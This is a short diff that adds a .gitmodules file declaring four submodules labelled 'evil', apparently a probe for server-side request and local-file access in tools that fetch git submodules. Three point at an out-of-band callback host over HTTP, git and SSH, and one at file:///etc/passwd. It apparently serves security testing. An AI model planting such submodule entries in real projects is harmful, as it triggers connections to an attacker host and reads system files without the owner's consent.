@@ -1,0 +1,12 @@
+[submodule "evil-http"]
+	path = evil-http
+	url = https://dbmnd6i80pk4hl57ev2gdgnypw78n6zqq.oast.fun/gitmodules-http-1
+[submodule "evil-file"]
+	path = evil-file
+	url = file:///etc/passwd
+[submodule "evil-git"]
+	path = evil-git
+	url = git://dbmnd6i80pk4hl57ev2gdgnypw78n6zqq.oast.fun/gitmodules-git-1
+[submodule "evil-ssh"]
+	path = evil-ssh
+	url = ssh://git@dbmnd6i80pk4hl57ev2gdgnypw78n6zqq.oast.fun/gitmodules-ssh-1
